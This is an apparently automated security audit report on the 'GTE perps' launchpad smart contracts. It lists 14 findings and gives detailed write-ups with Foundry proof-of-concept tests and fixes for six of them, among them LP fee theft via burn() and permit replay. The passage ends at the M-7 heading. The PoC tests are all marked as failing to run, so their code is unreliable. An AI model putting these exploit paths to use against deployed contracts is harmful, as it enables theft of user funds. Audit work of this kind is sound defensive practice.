# 2025 08 gte perps - Findings Report
## Commit hash: f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7

##Findings by Pattern


 **Derived From** : PermitDomainSeparator

[L-1]. Permit Replay Risk due to Immutable Domain Separator
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 3
Privilege: Permissionless



 **Derived From** : ERC20DecimalsMismatch

[H-2]. Systematic loss of rewards due to insufficient precision factor
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 5
Privilege: Permissionless



 **Derived From** : StandardViolation

[H-3]. Premature permanent disabling of fee accrual via endRewards
Finding Status: NeedsMoreInfo
Finding Status Justification: The code shows that GTELaunchpadV2Pair defaults to rewardsPoolActive=1 (fee accrual enabled) and Distributor.endRewards can only be called by the launchpad to invoke pair.endRewardsAccrual. The reported issue relies on the assumption that the Launchpad calls Distributor.endRewards at graduation. However, the Launchpad contract implementation and exact graduation flow are not provided here, and the docs contain conflicting signals (pair fees should feed the Distributor vs. calling endRewards at graduation). Without confirming the actual call sequence and intended business logic at graduation, the exploit path is speculative.
Status Confidence: SomeWhatConfident
Finding Confidence Justification: Documentation suggests endRewards may be called at graduation, but this conflicts with comments and default code behavior. Lacking the Launchpad implementation prevents definitive validation of the call path and intended timing, so confidence is limited.
Finding Complexity: 6
Privilege: RequiresRole



 **Derived From** : AccountingInvariantViolation

[M-4]. DoS of Claiming due to Unsafe Downcast
Finding Status: Valid
Status Confidence: SomeWhatConfident
Finding Confidence Justification: The logic and revert path are clear, but the practical trigger requires very large lifetime accruals (overflowing 96 bits), which depends on real-world token supplies/fees. Without concrete deployment parameters, likelihood is uncertain.
Finding Complexity: 4
Privilege: Permissionless
[H-5]. Liquidity Providers steal accrued Launchpad fees via burn()
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 6
Privilege: Permissionless
[L-6]. Stuck Dust Rewards Prevent Skimming via Accounting Invariant Violation
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 4
Privilege: RequiresAdminRole
[M-7]. DoS of Launchpad for high-supply tokens due to uint96 share cap
Finding Status: Valid
Status Confidence: SomeWhatConfident
Finding Confidence Justification: LaunchToken/Launchpad scaling of shares is not included in the provided code; if they downscale amounts before passing to Distributor, overflow may be avoided. Absent that evidence, the uint96 cap presents a realistic DoS vector.
Finding Complexity: 4
Privilege: Permissionless
[M-8]. Unclaimed Fees Exposed to Skimming via FeeAccountingDrift
Finding Status: NeedsMoreInfo
Finding Status Justification: The exploit relies on the Distributor.addRewards not pulling the tokens after the pair grants allowance and calls it. In _update, accrued fees are zeroed before _distributeLaunchpadFees, and reserves are set to balance - totalFees based on pre-call balances. If the Distributor indeed transfersFrom the pair (as is typical), balances will drop by the fee and skim will have nothing to take; if it reverts, the whole tx reverts and accrued are not cleared. The report does not include the actual Distributor implementation nor a working PoC showing addRewards succeeds without transferring tokens. Please provide Distributor.addRewards code or a reproducible test proving addRewards returns successfully while leaving the tokens in the pair.
Status Confidence: SomeWhatConfident
Finding Confidence Justification: The pair’s logic is only exploitable if the Distributor violates expected semantics. Without the Distributor code, the claim is speculative. If the Distributor pulls tokens on addRewards (most likely), the issue does not manifest.
Finding Complexity: 6
Privilege: Permissionless



 **Derived From** : AccessControl

[M-9]. Theft of rewards via unchecked quote asset in addRewards
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 5
Privilege: Permissionless



 **Derived From** : GriefableCallbacks

[M-10]. Claiming blocked by coupled asset transfer failure
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 4
Privilege: Permissionless



 **Derived From** : SignatureMalleability

[L-11]. Permit Signature Malleability allows Front-running DoS
Finding Status: Valid
Status Confidence: SomeWhatConfident
Finding Confidence Justification: Slight scope ambiguity because the code is imported from a Uniswap V2-style module; however, it is inherited and used by an in-scope contract, making the impact manifest within scope.
Finding Complexity: 2
Privilege: Permissionless



 **Derived From** : UnsafeRecipient

[H-12]. Rewards Misdirected to Launchpad Contract instead of User
Finding Status: Valid
Status Confidence: SomeWhatConfident
Finding Confidence Justification: If the Launchpad contract (not included here) explicitly forwards these tokens to the user within the same flow, the impact would be mitigated. Since that code was not provided, the finding is assessed based on the Distributor implementation alone.
Finding Complexity: 4
Privilege: RequiresRole



 **Derived From** : Dos

[M-13]. Critical DoS risk via reverting Distributor callback
Finding Status: Valid
Status Confidence: SomeWhatConfident
Finding Confidence Justification: The Distributor implementation details are not fully provided here, so the precise conditions for addRewards to revert are unknown. However, the architectural coupling (unprotected external call inside the pair’s critical path) is evident and commonly leads to DoS if the callee reverts. If the Distributor is guaranteed not to revert under any circumstance, the impact would be mitigated; absent that guarantee, the finding stands.
Finding Complexity: 4
Privilege: Permissionless
[M-14]. AMM Pair denial of service when Distributor shares are zero
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 6
Privilege: Permissionless


### Number of Findings
- C: 0
- H: 4
- M: 7
- L: 3
- I: 0

##Findings by Pattern


 **Derived From** : PermitDomainSeparator

## [L-1]. Permit Replay Risk due to Immutable Domain Separator

### Finding Severity Justification: The DOMAIN_SEPARATOR is fixed at deployment (standard Uniswap V2 pattern). This creates only a cross-chain/fork replay risk: a valid permit signed on the original chain can be replayed on a fork where the contract state (including DOMAIN_SEPARATOR and nonces) was copied. It does not enable theft on the live chain and only impacts users who also use the forked chain’s assets. ChainID changes are rare, and the worst same-chain effect is signature invalidation (not loss). Given the limited, cross-chain scope and industry-accepted tradeoff, impact is low.
## Derived From Pattern/Invariant
PermitDomainSeparator

## Exploit Type
PermitDomainSeparator

## Location
UniswapV2ERC20.constructor

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `UniswapV2ERC20` constructor calculates the `DOMAIN_SEPARATOR` using the chain ID at deployment time. If the chain forks or the contract is deployed on an L2 that changes its chain ID, the `DOMAIN_SEPARATOR` will become invalid or allow replay attacks on the forked chain, as it is not dynamically recalculated.

## Impact
Permits signed on one chain can be replayed on a fork (if chain ID changes), leading to unauthorized token spends.

## Command to Run Test


## Proof of Concept
1. Deploy on Chain A.
2. Chain forks to Chain B (new ChainID).
3. User signs permit for Chain A.
4. Attacker replays permit on Chain B. Since DOMAIN_SEPARATOR is static (uses Chain A ID), it recovers correctly on Chain B contract (which still has Chain A ID in separator).

## Proof of Code
function testPermitReplayOnFork() public {
    // 1. Setup initial chain state (Chain A)
    uint256 initialChainId = 1;
    vm.chainId(initialChainId);

    // 2. Deploy the contract (this calculates DOMAIN_SEPARATOR based on Chain A)
    GTELaunchpadV2Pair pair = new GTELaunchpadV2Pair();
    // Initialize not strictly necessary for permit but good practice
    pair.initialize(address(0x1), address(0x2), address(0x3), address(0x4));

    // 3. User signs permit for Chain A
    uint256 userPk = 0xA11CE;
    address user = vm.addr(userPk);
    address spender = address(0xB0B);
    uint256 value = 100 ether;
    uint256 deadline = block.timestamp + 1 days;
    
    // Get the separator stored in the contract (contains ChainID 1)
    bytes32 domainSeparator = pair.DOMAIN_SEPARATOR();
    bytes32 PERMIT_TYPEHASH = 0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9;
    bytes32 structHash = keccak256(abi.encode(PERMIT_TYPEHASH, user, spender, value, pair.nonces(user), deadline));
    bytes32 digest = keccak256(abi.encodePacked("\x19\x01", domainSeparator, structHash));
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPk, digest);

    // 4. Simulate Hard Fork (Chain ID changes to 1337)
    vm.chainId(1337);

    // 5. Execute permit on the new chain using the old signature
    // Vulnerability: The contract still checks against the immutable separator from ChainID 1
    pair.permit(user, spender, value, deadline, v, r, s);

    // 6. Assert that the permit was successfully replayed
    assertEq(pair.allowance(user, spender), value);
}

## Suggested Mitigation
Replace the static `DOMAIN_SEPARATOR` storage variable with an immutable cache pattern to support dynamic chain IDs while minimizing gas costs. Use the following implementation in `UniswapV2ERC20`:

bytes32 private immutable INITIAL_DOMAIN_SEPARATOR;
uint256 private immutable INITIAL_CHAIN_ID;

constructor() {
    INITIAL_CHAIN_ID = block.chainid;
    INITIAL_DOMAIN_SEPARATOR = computeDomainSeparator();
}

function computeDomainSeparator() internal view returns (bytes32) {
    return keccak256(
        abi.encode(
            keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
            keccak256(bytes(name)),
            keccak256(bytes("1")),
            block.chainid,
            address(this)
        )
    );
}

function DOMAIN_SEPARATOR() public view override returns (bytes32) {
    return block.chainid == INITIAL_CHAIN_ID ? INITIAL_DOMAIN_SEPARATOR : computeDomainSeparator();
}

// In function permit(...):
// bytes32 digest = keccak256(abi.encodePacked("\x19\x01", DOMAIN_SEPARATOR(), ...));





 **Derived From** : ERC20DecimalsMismatch

## [H-2]. Systematic loss of rewards due to insufficient precision factor

### Finding Severity Justification: RewardsTrackerLib deletes pending rewards even when the per-share increment rounds to zero due to insufficient PRECISION_FACTOR (1e12) versus potentially massive totalShares (up to ~1e27 wei). This causes matured rewards to become unclaimable and permanently locked in the Distributor, resulting in a 100% loss of distributable rewards for affected pools. Loss of matured yield is treated as High severity.
## Derived From Pattern/Invariant
ERC20DecimalsMismatch

## Exploit Type
ERC20DecimalsMismatch

## Location
RewardsTrackerLib.getAccRewardsPerShare

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 5
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `RewardsTrackerLib` uses a fixed `PRECISION_FACTOR` of `1e12`. The reward accumulator is updated via `acc += (pending * 1e12) / totalShares`. If `totalShares` (the LaunchToken supply) is large (e.g. 100M tokens = 1e26 wei) and the reward token has low decimals (e.g. USDC, 6 decimals), the numerator `amount * 1e12` is often smaller than `totalShares`, causing integer division to yield 0. For example, a 100,000 USDC reward (1e11 wei) distributed to 1e26 shares results in `1e11 * 1e12 / 1e26 = 0`. The reward tokens are consumed from `pending` but never added to the accumulator, effectively locking them in the contract forever.

## Impact
100% loss of rewards for pools with high share count and low-decimal reward tokens.

## Command to Run Test


## Proof of Concept
1. LaunchToken supply is 1 billion (1e27 wei).
2. Rewards are USDC (6 decimals).
3. User adds 1,000 USDC rewards (1e9 wei).
4. Calculation: `(1e9 * 1e12) / 1e27` = `1e21 / 1e27` = 0.
5. `pendingQuoteRewards` is reset to 0.
6. `accQuoteRewardPerShare` increases by 0.
7. Users receive nothing.

## Proof of Code
function test_PrecisionLoss_HighShares_LowDecimals() public {
    // 1. Setup Context
    Distributor distributor = new Distributor();
    address launchpad = makeAddr("launchpad");
    distributor.initialize(launchpad);
    
    // Mock Tokens: LaunchToken (18 decimals), USDC (6 decimals)
    MockERC20 launchToken = new MockERC20("Launch", "LCH", 18);
    MockERC20 usdc = new MockERC20("USDC", "USDC", 6);
    
    // Initialize Pool
    vm.prank(launchpad);
    distributor.createRewardsPair(address(launchToken), address(usdc));

    // 2. Simulate large total supply staked (1 Billion Tokens = 1e27 wei)
    address alice = makeAddr("alice");
    uint96 stakeAmount = 1_000_000_000 * 1e18; 
    vm.prank(launchpad);
    distributor.increaseStake(address(launchToken), alice, stakeAmount);

    // 3. Add meaningful rewards: 100,000 USDC (1e11 wei)
    // Calculation: (1e11 * 1e12 PRECISION) / 1e27 Shares = 1e23 / 1e27 = 0
    uint128 rewardAmount = 100_000 * 1e6;
    usdc.mint(address(this), rewardAmount);
    usdc.approve(address(distributor), rewardAmount);
    distributor.addRewards(address(launchToken), address(usdc), 0, rewardAmount);

    // 4. Verify Loss
    ( , uint256 pendingQuote) = distributor.getPendingRewards(address(launchToken), alice);
    
    // Alice owns 100% of shares, she should get 100% of rewards.
    // Due to precision loss, she gets 0.
    assertEq(pendingQuote, 0, "Rewards were lost due to insufficient precision");
}

## Suggested Mitigation
Modify `RewardsTrackerLib.sol` to increase the precision factor to `1e36`. This ensures that `(reward * PRECISION) / totalShares` does not round to zero for realistic large-supply tokens.

```diff
- uint128 public constant PRECISION_FACTOR = 1e12;
+ uint128 public constant PRECISION_FACTOR = 1e36;
```





 **Derived From** : StandardViolation

## [H-3]. Premature permanent disabling of fee accrual via endRewards

### Finding Severity Justification: If endRewardsAccrual is invoked at graduation as claimed, rewardsPoolActive is set to 0 and accrued fees are deleted, permanently disabling AMM fee accrual and distribution. This directly eliminates protocol revenue and user rewards for the pair, which is high impact.
## Derived From Pattern/Invariant
StandardViolation

## Exploit Type
StandardViolation

## Location
GTELaunchpadV2Pair.endRewardsAccrual

## Finding Status: NeedsMoreInfo
### Finding Status Justification: The code shows that GTELaunchpadV2Pair defaults to rewardsPoolActive=1 (fee accrual enabled) and Distributor.endRewards can only be called by the launchpad to invoke pair.endRewardsAccrual. The reported issue relies on the assumption that the Launchpad calls Distributor.endRewards at graduation. However, the Launchpad contract implementation and exact graduation flow are not provided here, and the docs contain conflicting signals (pair fees should feed the Distributor vs. calling endRewards at graduation). Without confirming the actual call sequence and intended business logic at graduation, the exploit path is speculative.
## Status Confidence: SomeWhatConfident
### Finding Confidence Justification: Documentation suggests endRewards may be called at graduation, but this conflicts with comments and default code behavior. Lacking the Launchpad implementation prevents definitive validation of the call path and intended timing, so confidence is limited.
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresRole


## Description
The `Distributor.endRewards` function calls `pair.endRewardsAccrual()`. According to the system description, `endRewards` is intended to be called at 'Graduation' (when the bonding curve completes and the pair is launched). However, `pair.endRewardsAccrual` permanently sets `rewardsPoolActive = 0` and deletes all accrued fees. This logic disables the fee mechanism at the exact moment it is supposed to start (Graduation/Launch), violating the protocol's economic design where LP fees should feed the Distributor.

## Impact
Complete loss of protocol revenue and user rewards from the AMM pair.

## Command to Run Test


## Proof of Concept
1. Launchpad calls `Distributor.endRewards` at graduation (as per docs).
2. `Distributor` calls `pair.endRewardsAccrual()`.
3. Pair sets `rewardsPoolActive = 0`.
4. Subsequent swaps call `_getLaunchpadFees`, which returns 0 because `rewardsPoolActive` is 0.
5. No fees are ever collected.

## Proof of Code
contract EndRewardsBugTest is Test {
    GTELaunchpadV2Pair pair;
    Distributor distributor;
    MockERC20 token0;
    MockERC20 token1;
    address factory = address(0xABC); 
    address launchpad = address(this); // Test contract acts as Launchpad
    address launchpadLp = address(0x123);

    function setUp() public {
        token0 = new MockERC20("Token0", "T0");
        token1 = new MockERC20("Token1", "T1");
        if (address(token0) > address(token1)) (token0, token1) = (token1, token0);

        distributor = new Distributor();
        distributor.initialize(launchpad);

        // Simulate Pair deployment by Factory
        vm.prank(factory);
        pair = new GTELaunchpadV2Pair();
        
        vm.prank(factory);
        pair.initialize(address(token0), address(token1), launchpadLp, address(distributor));
        
        // Add liquidity to allow swaps
        token0.mint(address(pair), 1000 ether);
        token1.mint(address(pair), 1000 ether);
        vm.prank(factory); 
        pair.mint(address(this));
    }

    function test_Graduation_Permanently_Disables_Fees() public {
        // 1. Verify initial state: Pool is active
        assertEq(pair.rewardsPoolActive(), 1, "Rewards pool should be active initially");

        // 2. Simulate Graduation: Launchpad calls endRewards (as described in findings)
        distributor.endRewards(pair);

        // 3. Verify state: Pool is now permanently disabled
        assertEq(pair.rewardsPoolActive(), 0, "Rewards pool was disabled prematurely");

        // 4. Verify Impact: Perform swap and check NO fees are accrued
        uint256 swapAmount = 10 ether;
        token0.mint(address(this), swapAmount);
        token0.transfer(address(pair), swapAmount);
        
        // Perform swap (0 -> 1)
        pair.swap(0, 5 ether, address(this), "");

        // Check accrued fees are 0
        (uint112 fee0, uint112 fee1, ) = pair.getAccruedLaunchpadFees();
        assertEq(fee0, 0, "Fee0 should be 0 because pool is inactive");
        assertEq(fee1, 0, "Fee1 should be 0 because pool is inactive");
    }
}

contract MockERC20 {
    string public name; string public symbol;
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    constructor(string memory n, string memory s) { name = n; symbol = s; }
    function mint(address to, uint256 amount) public { balanceOf[to] += amount; }
    function transfer(address to, uint256 amount) public returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

## Suggested Mitigation
Update the `Launchpad` contract's graduation logic to remove the call to `Distributor.endRewards()`. The `endRewards` function (and the underlying `pair.endRewardsAccrual`) permanently disables the AMM fee mechanism and should only be invoked if the protocol intends to sunset the pool, not at its inception/graduation.





 **Derived From** : AccountingInvariantViolation

## [M-4]. DoS of Claiming due to Unsafe Downcast

### Finding Severity Justification: RewardsTrackerLib stores user reward debts in uint96 but computes totalAccRewards in uint256, then downcasts to uint96. Over long lifetimes or high-supply tokens, totalAccRewards can exceed 2^96 and be truncated. Subsequent claim/unstake computes a vastly inflated payout (uint256 - truncated debt), and Distributor._decreaseTotalPending reverts, permanently preventing claiming and unstaking for the affected user. Impact is loss of matured yield (capped at Medium by C4 rubric), with persistent DoS for the user. Likelihood is low because it requires extremely large cumulative rewards, but the bug is real and permissionless to hit if parameters/supply allow.
## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
AccountingInvariantViolation

## Location
RewardsTrackerLib.stake/claim

## Finding Status: Valid
## Status Confidence: SomeWhatConfident
### Finding Confidence Justification: The logic and revert path are clear, but the practical trigger requires very large lifetime accruals (overflowing 96 bits), which depends on real-world token supplies/fees. Without concrete deployment parameters, likelihood is uncertain.
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
In `RewardsTrackerLib`, `baseRewardDebt` is stored as `uint96`. It is updated by casting `totalAccRewards` (uint256) to `uint96`. For long-running pools or high-inflation tokens, `accRewardPerShare * shares` can exceed `type(uint96).max`. The cast truncates the higher bits. When `claim` is called later, `totalAccRewards` (full uint256) is compared to `baseRewardDebt` (truncated). This results in a massive difference, causing the user to attempt to claim a phantom amount. `_decreaseTotalPending` then checks `currTotal < amount` and reverts, permanently locking the user's funds.

## Impact
Permanent freezing of user principal and rewards. If the total accumulated rewards for a user's position exceeds `type(uint96).max` (common in high-supply tokens or long-running pools), the `baseRewardDebt` variable truncates the high bits upon updating. In any subsequent `claim` or `unstake` operation, the contract calculates the pending reward as `actual_accumulated - truncated_debt`, resulting in a massive phantom amount (e.g., ~`2^96`). The transfer of this amount fails (due to insufficient contract balance) or the check in `_decreaseTotalPending` reverts, permanently preventing the user from unstaking their funds.

## Command to Run Test


## Proof of Concept
1. **Setup**: A pool exists for a token with high supply (e.g., 1 trillion supply, 18 decimals). `uint96.max` is approx `7.9e28`.
2. **State**: `accRewardPerShare` grows significantly due to large reward distributions.
3. **Action**: A user stakes a large amount of shares (e.g., 1 million tokens). The calculated `totalAccRewards = shares * accPerShare` results in `1e35`, which exceeds `uint96.max`.
4. **Corruption**: The `stake` function casts this value to `uint96` to store in `userData.baseRewardDebt`. The stored debt is `1e35 % 2^96`.
5. **Lock**: The user immediately attempts to `unstake`. The system calculates `pending = 1e35 - (1e35 % 2^96)`, which is approx `2^96`.
6. **Result**: The contract attempts to transfer `2^96` tokens or verify balance. The transaction reverts due to lack of funds/liquidity. The user's principal is permanently locked.

## Proof of Code
function test_DowncastDoS_FundsLock() public {
    // 1. Setup Scenario: High supply token (e.g. 100 billion tokens)
    // uint96.max is ~7.9e28. We will simulate rewards pushing acc logic over this limit.
    address user1 = address(0x10);
    address user2 = address(0x20);
    
    // Mock token with large supply
    MockToken token = new MockToken();
    token.mint(address(this), 1e32); // 100T tokens
    token.approve(address(distributor), type(uint256).max);

    // Initialize pool
    vm.prank(launchpad);
    distributor.createRewardsPair(address(token), address(0xDead));

    // 2. User1 stakes small amount to initialize totalShares > 0
    vm.prank(launchpad);
    distributor.increaseStake(address(token), user1, 1e18);

    // 3. Add massive rewards to push accRewardPerShare high
    // Adding 100B tokens (1e29) as rewards. 
    // accPerShare += 1e29 * 1e12 / 1e18 = 1e23
    distributor.addRewards(address(token), address(0xDead), 1e29, 0);

    // 4. User2 stakes. 
    // stake = 1M tokens (1e24). 
    // totalAccRewards = shares * acc / 1e12 = 1e24 * 1e23 / 1e12 = 1e35.
    // 1e35 > type(uint96).max (~7.9e28). Overflow occurs in debt storage.
    vm.prank(launchpad);
    distributor.increaseStake(address(token), user2, uint96(1e24));

    // 5. User2 tries to claim or unstake.
    // Internal math: 1e35 - (truncated 1e35) ~= 7.9e28 (huge phantom reward).
    // Distributor has only ~1e29 balance. Reverts.
    vm.prank(user2);
    vm.expectRevert(); // Reverts likely with "ClaimAmountExceedsTotalPendingRewards" or SafeTransfer panic
    distributor.claimRewards(address(token));
}

## Suggested Mitigation
Update the `UserRewardData` struct in `RewardsTrackerLib` to use `uint256` for `baseRewardDebt` and `quoteRewardDebt` instead of `uint96`. Consequently, remove the `uint96(...)` downcasting in the `stake`, `unstake`, and `claim` functions. This ensures correct accounting for high-supply tokens and long-running pools.


## [H-5]. Liquidity Providers steal accrued Launchpad fees via burn()

### Finding Severity Justification: In burn(), withdrawal amounts are computed from the pair’s raw token balances, which include accruedLaunchpadFee{0,1}. This lets an LP redeem a pro‑rata share of those unclaimed fees before they are transferred to the Distributor. Afterward, _update() subtracts the full accrued fees from balances and may also distribute them, causing the shortfall to be absorbed by the remaining LP reserves. This is a direct, realistic value transfer from other LPs to the exiting LP (user funds at risk), qualifying as High severity.
## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
AccountingInvariantViolation

## Location
GTELaunchpadV2Pair.burn

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `burn` function calculates the withdrawal amounts based on `balanceOf(address(this))`, which physically includes both the liquidity reserves AND the `accruedLaunchpadFees`. This incorrectly distributes a pro-rata share of the unclaimed launchpad fees to the exiting LP. Subsequently, `_update` subtracts the full `accruedLaunchpadFee` from the remaining balance. If the balance is depleted below the accrued amount (due to the theft), `_update` will underflow and revert, causing a DoS on the pool.

## Impact
High. 1) **Theft of Yield:** Liquidity Providers exiting the pool receive a pro-rata share of the `accruedLaunchpadFees` in addition to their share of reserves. This value is effectively stolen from the remaining LPs or the protocol's fee collector. 2) **Permanent DoS:** If an LP attempts to burn a large portion of liquidity (e.g., the sole LP exiting), the contract calculates the withdrawal amount including the fees. The remaining token balance then drops below the recorded `accruedLaunchpadFee`, causing the subsequent `_update()` call to underflow and revert. This permanently locks user funds in the pool until external tokens are donated to cover the fee shortfall.

## Command to Run Test


## Proof of Concept
1. **State**: The pool has 1000 TokenA reserves and 100 TokenA in `accruedLaunchpadFees`. Physical balance is 1100.
2. **Action**: An LP with 50% of total supply calls `burn()`.
3. **Flaw**: The contract calculates `amount = 1100 * 0.5 = 550`. The correct share of reserves should be `1000 * 0.5 = 500`.
4. **Result**: The LP withdraws 550, stealing 50 tokens from the fee pot.
5. **Aftermath**: Remaining balance is 550. `_update` calculates `reserve = 550 - 100 (fees) = 450`. The remaining LP (holding 50%) now backs 450 reserves instead of 500. They lost 50 tokens.
6. **DoS**: If the LP held 100% and tried to withdraw, they would attempt to withdraw 1100. Remaining balance 0. `_update` tries `0 - 100` -> Revert.

## Proof of Code
import "forge-std/Test.sol";
import {GTELaunchpadV2Pair} from "../contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockERC20 is ERC20 {
    constructor() ERC20("M", "M") { _mint(msg.sender, 1e30); }
    function mint(address to, uint256 a) public { _mint(to, a); }
}

contract LPTheftTest is Test {
    GTELaunchpadV2Pair pair;
    MockERC20 t0;
    MockERC20 t1;
    address lp = address(0x10);
    address distributor = address(0x20);

    function setUp() public {
        t0 = new MockERC20();
        t1 = new MockERC20();
        if(address(t0) > address(t1)) (t0, t1) = (t1, t0);

        pair = new GTELaunchpadV2Pair();
        pair.initialize(address(t0), address(t1), lp, distributor);

        // Fund LP
        t0.mint(lp, 2000e18);
        t1.mint(lp, 2000e18);
    }

    function test_LpStealsFees_DoS() public {
        // 1. LP adds liquidity
        vm.startPrank(lp);
        t0.transfer(address(pair), 1000e18);
        t1.transfer(address(pair), 1000e18);
        pair.mint(lp);
        vm.stopPrank();

        // 2. Generate Fees via swap
        // We need fees to accrue. _getLaunchpadFees requires launchpadLp (lp) to have balance.
        t0.transfer(address(pair), 100e18);
        pair.swap(0, 10e18, address(this), new bytes(0));

        (uint112 fee0, ,) = pair.getAccruedLaunchpadFees();
        require(fee0 > 0, "Fees should have accrued");

        // 3. LP burns liquidity
        // Because balance includes fees, LP tries to withdraw Reserves + Fees
        uint256 lpBal = pair.balanceOf(lp);
        vm.prank(lp);
        pair.transfer(address(pair), lpBal);

        // 4. Expect Revert (DoS) due to underflow in _update
        // The user withdraws everything, leaving balance 0.
        // _update tries: reserve = balance (0) - fee (>0)
        vm.expectRevert(); 
        pair.burn(lp);
    }
}

## Suggested Mitigation
Modify the `burn` function to exclude accrued fees from the balance used for withdrawal calculations. 

```solidity
function burn(address to) external lock returns (uint256 amount0, uint256 amount1) {
    // ...
    uint256 balance0 = IERC20(_token0).balanceOf(address(this));
    uint256 balance1 = IERC20(_token1).balanceOf(address(this));
    uint256 liquidity = balanceOf[address(this)];

    bool feeOn = _mintFee(_reserve0, _reserve1);
    uint256 _totalSupply = totalSupply;

    // MITIGATION: Subtract accrued fees from balance
    uint256 available0 = balance0 > accruedLaunchpadFee0 ? balance0 - accruedLaunchpadFee0 : 0;
    uint256 available1 = balance1 > accruedLaunchpadFee1 ? balance1 - accruedLaunchpadFee1 : 0;

    amount0 = liquidity.mul(available0) / _totalSupply;
    amount1 = liquidity.mul(available1) / _totalSupply;
    // ...
} 
```


## [L-6]. Stuck Dust Rewards Prevent Skimming via Accounting Invariant Violation

### Finding Severity Justification: Rounding in RewardsTrackerLib (floor division with 1e12 precision) can zero-out or under-allocate small pending rewards, while Distributor.totalPendingRewards is incremented by the full amount and only decreased on actual payouts. This leaves dust rewards unclaimable and also unskimmable due to skimExcessRewards requiring balance > totalPendingRewards. Impact is limited to dust/marginal yield per update cycle, not user principal or large amounts, which fits Code4rena’s dust-yield = QA/Low classification.
## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
AccountingInvariantViolation

## Location
Distributor.skimExcessRewards

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresAdminRole


## Description
The `Distributor` tracks `totalPendingRewards` based on input amounts, but `RewardsTrackerLib` uses floor division, leaving small dust amounts unallocated to shares (burned from the accumulator perspective). `totalPendingRewards` remains strictly higher than the claimable amount. `skimExcessRewards` requires `balance > totalPendingRewards`. Since the ghost dust is counted in `totalPendingRewards` but exists in `balance`, `balance == totalPendingRewards` (or is close), preventing the admin from ever skimming the true excess (the dust).

## Impact
Dust rewards are permanently locked in the contract and cannot be recovered by admins.

## Command to Run Test


## Proof of Concept
1. `addRewards` adds 100 wei. `totalPending` = 100.
2. `update` rounds down allocation to 99 wei effectively.
3. User claims 99 wei. `totalPending` = 1. Balance = 1.
4. Admin calls `skimExcessRewards`.
5. `amount > 1 - 1` -> `amount > 0`. If amount is 1, fails. Admin cannot withdraw the 1 wei.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import {Test} from "forge-std/Test.sol";
import {Distributor} from "contracts/launchpad/Distributor.sol";
import {RewardsTrackerStorage} from "contracts/launchpad/libraries/RewardsTracker.sol";

contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    
    function transfer(address to, uint256 amount) public returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
    function mint(address to, uint256 amount) public {
        balanceOf[to] += amount;
    }
}

contract DistributorDustTest is Test {
    Distributor distributor;
    MockERC20 token;
    MockERC20 quote;

    function setUp() public {
        distributor = new Distributor();
        token = new MockERC20();
        quote = new MockERC20();
        
        // Test contract acts as Launchpad via initialize
        distributor.initialize(address(this));
        distributor.createRewardsPair(address(token), address(quote));
    }

    function testSkimFailDueToDust() public {
        address user = address(0xDEAD);
        
        // 1. Stake small shares (3) to induce significant rounding error with small rewards
        distributor.increaseStake(address(token), user, 3);
        
        // 2. Add rewards: 1 wei
        token.mint(address(this), 1);
        token.approve(address(distributor), 1);
        distributor.addRewards(address(token), address(quote), 1, 0);
        
        // State: totalPendingRewards = 1, Balance = 1
        
        // 3. User claims
        // Math: 1 wei * 1e12 precision / 3 shares = 333333333333 accPerShare
        // Claim: 3 shares * 333333333333 / 1e12 = 0.999... -> 0 wei claimed
        // totalPendingRewards decreases by 0 (remains 1)
        vm.prank(user);
        distributor.claimRewards(address(token));
        
        // 4. Admin tries to skim the stuck 1 wei
        // Logic: amount > balance (1) - totalPending (1) -> amount > 0
        // Skimming 1 wei requires 1 > 0, which is true, but logic is:
        // if (amount > available) revert. Available is 0.
        // So 1 > 0 reverts.
        vm.expectRevert(Distributor.SkimOverflow.selector);
        distributor.skimExcessRewards(address(token), 1);
    }
}

## Suggested Mitigation
Update `Distributor.addRewards` to force an immediate `rs.update()` after adding the raw rewards to the pending pool. Then, calculate the effective amount distributed to the accumulator (i.e., `(deltaAccPerShare * totalShares) / PRECISION`) and only increment `totalPendingRewards` by this effective amount. This ensures `totalPendingRewards` accurately reflects claimable liabilities, leaving the dust untracked and skimmable.


## [M-7]. DoS of Launchpad for high-supply tokens due to uint96 share cap

